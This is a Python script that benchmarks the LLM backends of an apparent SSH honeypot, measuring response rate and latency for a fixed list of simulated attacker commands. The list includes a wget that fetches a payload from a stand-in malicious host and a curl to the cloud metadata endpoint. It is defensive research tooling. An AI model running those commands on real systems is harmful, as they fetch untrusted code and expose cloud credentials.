#!/usr/bin/env python3
"""
benchmark_llm.py — Compare the LLM API backends used by the honeypot.

PURPOSE (for the experimental-results section of the rapport):
    Send a fixed set of realistic attacker commands to every configured
    LLM provider and measure, per provider:

      * Taux de réponse (response rate) — % of requests that returned
        usable output (no error, no timeout, non-empty answer).
      * Latence (latency) — mean / median / p95 / min / max, in milliseconds.
      * Longueur moyenne — average response length in characters
        (a rough proxy for how "rich" each model's output is).

    This lets you justify, with numbers, *which* API you picked and why.

METHODOLOGY:
    - We reuse the real honeypot system prompt (config/persona_ssh.yaml via
      PromptBuilder) so the measured behaviour matches production.
    - We only test commands that the honeypot actually forwards to the LLM
      (the static built-ins like `ls`/`whoami` never reach the API, so
      benchmarking them would be meaningless).
    - Requests are sent sequentially per provider, so one request's latency
      never overlaps another's — the timings stay clean.
    - Latency statistics are computed over SUCCESSFUL requests only; a
      timeout would otherwise inflate the average.

USAGE:
    python scripts/benchmark_llm.py                  # all providers, 1 run each
    python scripts/benchmark_llm.py --runs 3         # repeat 3× for stable means
    python scripts/benchmark_llm.py --provider grok  # test a single provider
    python scripts/benchmark_llm.py --timeout 20     # per-request timeout (s)

OUTPUT:
    - A comparison table printed to the console.
    - results/benchmark_<timestamp>.json  (full data, including raw samples)
    - results/benchmark_<timestamp>.csv   (one summary row per provider —
      easy to paste into a spreadsheet or the rapport)

REQUIREMENTS:
    Set the relevant API keys in your .env first (GROK_API_KEY,
    CEREBRAS_API_KEY, OPENAI_API_KEY, ANTHROPIC_API_KEY) and/or
    OLLAMA_ENABLED=true. Only providers with a key/flag set are tested.
"""
from __future__ import annotations

import argparse
import asyncio
import csv
import json
import statistics
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Awaitable, Callable

# Allow running from the project root (same trick as scripts/seed_redis.py).
sys.path.insert(0, str(Path(__file__).parent.parent))

from app.config import settings
from app.llm.prompt_builder import PromptBuilder
from app.session.models import Session

# ── Test workload ───────────────────────────────────────────────────────────
# Commands an attacker would type that are NOT handled by the static built-ins,
# so each of these genuinely hits the LLM API. Mix of recon, enumeration and
# exploitation so the model has to produce varied output.
_TEST_COMMANDS = [
    "ps aux",
    "netstat -tulpn",
    "df -h",
    "free -h",
    "top -bn1",
    "find / -perm -4000 2>/dev/null",
    "sudo -l",
    "crontab -l",
    "systemctl status ssh",
    "docker ps",
    "lscpu",
    "dpkg -l | head",
    "ss -tlnp",
    "iptables -L",
    "wget http://malicious.example/payload.sh",
    "curl http://169.254.169.254/latest/meta-data/",
]


# ── Data containers ─────────────────────────────────────────────────────────

@dataclass
class Sample:
    """One measured request."""
    command: str
    ok: bool
    latency_ms: float
    length: int
    error: str = ""


@dataclass
class Provider:
    """A backend under test: a name, its model, and how to call it."""
    name: str
    model: str
    call: Callable[[str, str], Awaitable[str]]  # (system_prompt, user_msg) -> reply
    samples: list[Sample] = field(default_factory=list)


# ── Provider call implementations ───────────────────────────────────────────
# Each function performs ONE API request and returns the model's text reply.
# They mirror exactly how app/llm/orchestrator.py talks to each provider, so
# the benchmark reflects real honeypot behaviour.

async def _call_openai_compatible(
    api_key: str, base_url: str, model: str, system: str, user: str
) -> str:
    """Grok, Cerebras and OpenAI all share the OpenAI chat-completions API."""
    from openai import AsyncOpenAI

    client = AsyncOpenAI(api_key=api_key, base_url=base_url)
    completion = await client.chat.completions.create(
        model=model,
        messages=[
            {"role": "system", "content": system},
            {"role": "user", "content": user},
        ],
        max_tokens=512,
        temperature=0.4,
    )
    return completion.choices[0].message.content or ""


async def _call_ollama(model: str, system: str, user: str) -> str:
    """Local Ollama HTTP API (only if OLLAMA_ENABLED=true)."""
    import httpx

    async with httpx.AsyncClient(timeout=60.0) as client:
        resp = await client.post(
            f"{settings.ollama_url}/api/generate",
            json={
                "model": model,
                "system": system,
                "prompt": user,
                "stream": False,
                "options": {"temperature": 0.4, "num_predict": 512},
            },
        )
        resp.raise_for_status()
        return str(resp.json().get("response", "")).strip()


async def _call_anthropic(model: str, system: str, user: str) -> str:
    """Anthropic uses its own SDK (not OpenAI-compatible)."""
    import anthropic

    client = anthropic.AsyncAnthropic(api_key=settings.anthropic_api_key)
    message = await client.messages.create(
        model=model,
        max_tokens=512,
        system=system,
        messages=[{"role": "user", "content": user}],
    )
    return message.content[0].text if message.content else ""


def _build_providers(only: str | None) -> list[Provider]:
    """
    Build the list of providers to test from the .env settings.

    A provider is included only if its API key is set (or, for Ollama,
    if OLLAMA_ENABLED=true). `only` restricts the run to a single provider.
    """
    providers: list[Provider] = []

    if settings.grok_api_key:
        providers.append(Provider(
            name="grok",
            model=settings.grok_model,
            call=lambda s, u: _call_openai_compatible(
                settings.grok_api_key, settings.grok_base_url,
                settings.grok_model, s, u,
            ),
        ))

    if settings.cerebras_api_key:
        providers.append(Provider(
            name="cerebras",
            model=settings.cerebras_model,
            call=lambda s, u: _call_openai_compatible(
                settings.cerebras_api_key, settings.cerebras_base_url,
                settings.cerebras_model, s, u,
            ),
        ))

    if settings.ollama_enabled:
        providers.append(Provider(
            name="ollama",
            model=settings.ollama_model,
            call=lambda s, u: _call_ollama(settings.ollama_model, s, u),
        ))

    if settings.openai_api_key:
        providers.append(Provider(
            name="openai",
            model=settings.openai_model,
            call=lambda s, u: _call_openai_compatible(
                settings.openai_api_key, "https://api.openai.com/v1",
                settings.openai_model, s, u,
            ),
        ))

    if settings.anthropic_api_key:
        providers.append(Provider(
            name="anthropic",
            model=settings.anthropic_model,
            call=lambda s, u: _call_anthropic(settings.anthropic_model, s, u),
        ))

    if only:
        providers = [p for p in providers if p.name == only]

    return providers


# ── Measurement ─────────────────────────────────────────────────────────────

async def _measure(provider: Provider, prompts: list[tuple[str, str, str]],
                   timeout: float) -> None:
    """
    Run every (command, system, user) prompt against one provider and record
    a Sample for each. Mutates `provider.samples`.
    """
    for command, system, user in prompts:
        start = time.perf_counter()
        try:
            reply = await asyncio.wait_for(provider.call(system, user), timeout)
            latency_ms = (time.perf_counter() - start) * 1000
            ok = bool(reply and reply.strip())
            provider.samples.append(
                Sample(command, ok, latency_ms, len(reply or ""))
            )
            status = "ok " if ok else "empty"
            print(f"    [{provider.name:9}] {status} {latency_ms:7.0f} ms  {command}")
        except Exception as exc:
            latency_ms = (time.perf_counter() - start) * 1000
            # Keep the full message (not just the type) — e.g. a 404 tells us
            # exactly which model/endpoint was rejected.
            detail = f"{type(exc).__name__}: {exc}"
            provider.samples.append(
                Sample(command, False, latency_ms, 0, error=detail)
            )
            print(f"    [{provider.name:9}] FAIL {latency_ms:7.0f} ms  {command}  "
                  f"({detail[:160]})")


# ── Metrics ─────────────────────────────────────────────────────────────────

def _percentile(values: list[float], pct: float) -> float:
    """Linear-interpolation percentile (e.g. pct=95 → p95). 0.0 if empty."""
    if not values:
        return 0.0
    ordered = sorted(values)
    if len(ordered) == 1:
        return ordered[0]
    rank = (len(ordered) - 1) * (pct / 100.0)
    low = int(rank)
    high = min(low + 1, len(ordered) - 1)
    frac = rank - low
    return ordered[low] * (1 - frac) + ordered[high] * frac


def _summarize(provider: Provider) -> dict[str, float | int | str]:
    """Aggregate a provider's samples into the metrics we report."""
    total = len(provider.samples)
    ok_samples = [s for s in provider.samples if s.ok]
    success = len(ok_samples)
    latencies = [s.latency_ms for s in ok_samples]
    lengths = [s.length for s in ok_samples]

    return {
        "provider": provider.name,
        "model": provider.model,
        "requests": total,
        "success": success,
        # Taux de réponse — the headline metric for the rapport.
        "response_rate_pct": round(100.0 * success / total, 1) if total else 0.0,
        "mean_ms": round(statistics.mean(latencies), 0) if latencies else 0.0,
        "median_ms": round(statistics.median(latencies), 0) if latencies else 0.0,
        "p95_ms": round(_percentile(latencies, 95), 0),
        "min_ms": round(min(latencies), 0) if latencies else 0.0,
        "max_ms": round(max(latencies), 0) if latencies else 0.0,
        "avg_len": round(statistics.mean(lengths), 0) if lengths else 0.0,
    }


# ── Reporting ───────────────────────────────────────────────────────────────

def _print_table(summaries: list[dict]) -> None:
    """Print the comparison table to the console."""
    header = (
        f"{'Provider':10} {'Model':22} {'Req':>4} {'OK':>4} "
        f"{'Rate%':>6} {'Mean':>7} {'Med':>7} {'P95':>7} "
        f"{'Min':>7} {'Max':>7} {'AvgLen':>7}"
    )
    print("\n" + "=" * len(header))
    print(header)
    print("-" * len(header))
    for s in summaries:
        print(
            f"{s['provider']:10} {str(s['model'])[:22]:22} "
            f"{s['requests']:>4} {s['success']:>4} "
            f"{s['response_rate_pct']:>6} {s['mean_ms']:>7.0f} "
            f"{s['median_ms']:>7.0f} {s['p95_ms']:>7.0f} "
            f"{s['min_ms']:>7.0f} {s['max_ms']:>7.0f} {s['avg_len']:>7.0f}"
        )
    print("=" * len(header))
    print("Latencies in milliseconds. Rate% = taux de réponse "
          "(successful / total requests).")


def _pick_winner(summaries: list[dict]) -> None:
    """Suggest the 'best' provider: highest response rate, then lowest median latency."""
    ranked = sorted(
        summaries,
        key=lambda s: (-s["response_rate_pct"], s["median_ms"] or float("inf")),
    )
    if ranked:
        best = ranked[0]
        print(f"\n  → Best overall: {best['provider']} "
              f"({best['response_rate_pct']}% response rate, "
              f"{best['median_ms']:.0f} ms median latency)")


def _save_results(summaries: list[dict], providers: list[Provider],
                  runs: int) -> tuple[Path, Path]:
    """Write the JSON (full) and CSV (summary) result files. Returns their paths."""
    results_dir = Path(__file__).parent.parent / "results"
    results_dir.mkdir(exist_ok=True)
    stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

    json_path = results_dir / f"benchmark_{stamp}.json"
    json_path.write_text(json.dumps({
        "timestamp_utc": stamp,
        "runs": runs,
        "commands_per_run": len(_TEST_COMMANDS),
        "summaries": summaries,
        # Raw per-request samples, in case you want to plot distributions.
        "raw": {
            p.name: [vars(s) for s in p.samples] for p in providers
        },
    }, indent=2), encoding="utf-8")

    csv_path = results_dir / f"benchmark_{stamp}.csv"
    with open(csv_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=list(summaries[0].keys()))
        writer.writeheader()
        writer.writerows(summaries)

    return json_path, csv_path


# ── Entry point ─────────────────────────────────────────────────────────────

async def main() -> None:
    parser = argparse.ArgumentParser(description="Benchmark honeypot LLM backends.")
    parser.add_argument("--runs", type=int, default=1,
                        help="How many times to run the full command set (default 1).")
    parser.add_argument("--provider", default=None,
                        help="Test only this provider (grok, cerebras, ollama, "
                             "openai, anthropic).")
    parser.add_argument("--timeout", type=float, default=30.0,
                        help="Per-request timeout in seconds (default 30).")
    args = parser.parse_args()

    providers = _build_providers(args.provider)
    if not providers:
        print("No providers configured. Set an API key in .env "
              "(GROK_API_KEY, CEREBRAS_API_KEY, ...) or OLLAMA_ENABLED=true.")
        return

    # Pre-build the (command, system_prompt, user_message) prompts once, using
    # the real honeypot PromptBuilder so the workload matches production.
    pb = PromptBuilder(Path("config/persona_ssh.yaml"))
    prompts: list[tuple[str, str, str]] = []
    for command in _TEST_COMMANDS:
        session = Session(attacker_ip="benchmark", service="ssh", username="admin")
        session.command_history = [command]
        prompts.append((
            command,
            pb.get_system_prompt(session),
            pb.build_user_message(command, session),
        ))

    # Repeat the workload `--runs` times for more stable averages.
    workload = prompts * args.runs

    print("IntelliHoneypot — LLM Benchmark")
    print(f"Providers: {', '.join(p.name for p in providers)}")
    print(f"Commands per run: {len(_TEST_COMMANDS)} | Runs: {args.runs} | "
          f"Total requests/provider: {len(workload)}")
    print(f"Timeout: {args.timeout}s\n")

    for provider in providers:
        print(f"  Testing {provider.name} ({provider.model})...")
        await _measure(provider, workload, args.timeout)

    summaries = [_summarize(p) for p in providers]
    _print_table(summaries)
    _pick_winner(summaries)

    json_path, csv_path = _save_results(summaries, providers, args.runs)
    print(f"\nSaved:\n  {json_path}\n  {csv_path}")


if __name__ == "__main__":
    asyncio.run(main())
